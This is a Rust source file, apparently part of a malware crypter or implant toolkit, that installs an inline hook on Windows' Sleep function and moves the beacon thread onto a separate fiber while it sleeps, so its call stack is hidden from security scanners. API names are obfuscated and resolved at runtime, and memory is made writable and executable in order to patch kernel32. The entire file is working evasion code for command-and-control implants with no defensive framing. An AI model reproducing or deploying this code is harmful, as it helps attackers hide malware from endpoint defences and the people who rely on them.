use std::ffi::c_void;
use std::ptr;
use crate::utils::{load_library, get_proc_address};
use rustcrypt_ct_macros::obf_lit_bytes;

// Global variables to store hook state
static mut ORIGINAL_BYTES: [u8; 16] = [0; 16];
static mut TRAMPOLINE_BYTES: [u8; 16] = [0; 16];
static mut HOOK_SIZE: usize = 0;
static mut FIBER_MAIN: *mut c_void = ptr::null_mut();
static mut BEACON_THREAD_ID: u32 = 0;

// Function types
type SleepFn = unsafe extern "system" fn(u32);
type ConvertThreadToFiberFn = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
type CreateFiberFn = unsafe extern "system" fn(usize, unsafe extern "system" fn(*mut c_void), *mut c_void) -> *mut c_void;
type SwitchToFiberFn = unsafe extern "system" fn(*mut c_void);
type DeleteFiberFn = unsafe extern "system" fn(*mut c_void);
type GetFiberDataFn = unsafe extern "system" fn() -> *mut c_void;
type GetCurrentThreadIdFn = unsafe extern "system" fn() -> u32;
type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
type GetCurrentProcessFn = unsafe extern "system" fn() -> isize;
type WaitForSingleObjectFn = unsafe extern "system" fn(isize, u32) -> u32;

unsafe extern "system" fn my_sleep_fiber_proc(_param: *mut c_void) {
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice()).unwrap();
    let get_fiber_data: GetFiberDataFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetFiberData\0").as_slice()).unwrap());
    let get_current_process: GetCurrentProcessFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetCurrentProcess\0").as_slice()).unwrap());
    let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"WaitForSingleObject\0").as_slice()).unwrap());
    let switch_to_fiber: SwitchToFiberFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"SwitchToFiber\0").as_slice()).unwrap());

    let ms_ptr = get_fiber_data() as *mut u32;
    let ms = *ms_ptr;

    wait_for_single_object(get_current_process(), ms);
    switch_to_fiber(FIBER_MAIN);
}

pub unsafe extern "system" fn my_sleep_hook(ms: u32) {
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice()).unwrap();
    let get_current_thread_id: GetCurrentThreadIdFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetCurrentThreadId\0").as_slice()).unwrap());
    let sleep: SleepFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"Sleep\0").as_slice()).unwrap());
    
    if get_current_thread_id() == BEACON_THREAD_ID {
        // Unhook Sleep
        fast_trampoline(sleep as *mut c_void, false);

        let convert_thread_to_fiber: ConvertThreadToFiberFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ConvertThreadToFiber\0").as_slice()).unwrap());
        let create_fiber: CreateFiberFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateFiber\0").as_slice()).unwrap());
        let switch_to_fiber: SwitchToFiberFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"SwitchToFiber\0").as_slice()).unwrap());
        let delete_fiber: DeleteFiberFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"DeleteFiber\0").as_slice()).unwrap());

        if FIBER_MAIN.is_null() {
            FIBER_MAIN = convert_thread_to_fiber(ptr::null_mut());
        }

        let mut sleep_time = ms;
        let another_fiber = create_fiber(0, my_sleep_fiber_proc, &mut sleep_time as *mut u32 as *mut c_void);
        switch_to_fiber(another_fiber);
        delete_fiber(another_fiber);

        fast_trampoline(sleep as *mut c_void, true);
    } else {
        type SleepExFn = unsafe extern "system" fn(u32, u32) -> u32;
        let sleep_ex: SleepExFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"SleepEx\0").as_slice()).unwrap());
        sleep_ex(ms, 0);
    }
}

unsafe fn fast_trampoline(address_to_hook: *mut c_void, install_hook: bool) -> bool {
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice()).unwrap();
    let virtual_protect: VirtualProtectFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"VirtualProtect\0").as_slice()).unwrap());

    let mut old_prot: u32 = 0;
    if virtual_protect(address_to_hook, HOOK_SIZE, 0x40, &mut old_prot) == 0 { // PAGE_EXECUTE_READWRITE
        return false;
    }

    if install_hook {
        ptr::copy_nonoverlapping(ptr::addr_of!(TRAMPOLINE_BYTES) as *const u8, address_to_hook as *mut u8, HOOK_SIZE);
    } else {
        ptr::copy_nonoverlapping(ptr::addr_of!(ORIGINAL_BYTES) as *const u8, address_to_hook as *mut u8, HOOK_SIZE);
    }


    let mut temp_old: u32 = 0;
    virtual_protect(address_to_hook, HOOK_SIZE, old_prot, &mut temp_old);

    true
}

pub unsafe fn enable_stack_spoof() {
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice()).unwrap();
    let get_current_thread_id: GetCurrentThreadIdFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetCurrentThreadId\0").as_slice()).unwrap());
    let sleep: SleepFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"Sleep\0").as_slice()).unwrap());

    BEACON_THREAD_ID = get_current_thread_id();
    
    // Initialize hook structures
    HOOK_SIZE = 16; // Size of our buffer
    
    // Save original bytes
    ptr::copy_nonoverlapping(sleep as *const u8, ptr::addr_of_mut!(ORIGINAL_BYTES) as *mut u8, HOOK_SIZE);
    
    // Prepare trampoline
    // x64: mov r10, addr; jmp r10
    #[cfg(target_arch = "x86_64")]
    {
        let mut trampoline = [
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
            0x41, 0xFF, 0xE2, 0x90, 0x90, 0x90                          // jmp r10 (nop padding)
        ];
        let addr = my_sleep_hook as *const () as usize as u64;
        ptr::copy_nonoverlapping(&addr as *const u64 as *const u8, trampoline.as_mut_ptr().add(2), 8);
        ptr::copy_nonoverlapping(trampoline.as_ptr(), ptr::addr_of_mut!(TRAMPOLINE_BYTES) as *mut u8, 16);
    }

    #[cfg(target_arch = "x86")]
    {
        let mut trampoline = [
            0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
            0xFF, 0xE0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 // jmp eax (nop padding)
        ];
        let addr = my_sleep_hook as *const () as usize as u32;
        ptr::copy_nonoverlapping(&addr as *const u32 as *const u8, trampoline.as_mut_ptr().add(1), 4);
        ptr::copy_nonoverlapping(trampoline.as_ptr(), ptr::addr_of_mut!(TRAMPOLINE_BYTES) as *mut u8, 16);
    }

    // Install hook initially
    fast_trampoline(sleep as *mut c_void, true);
}
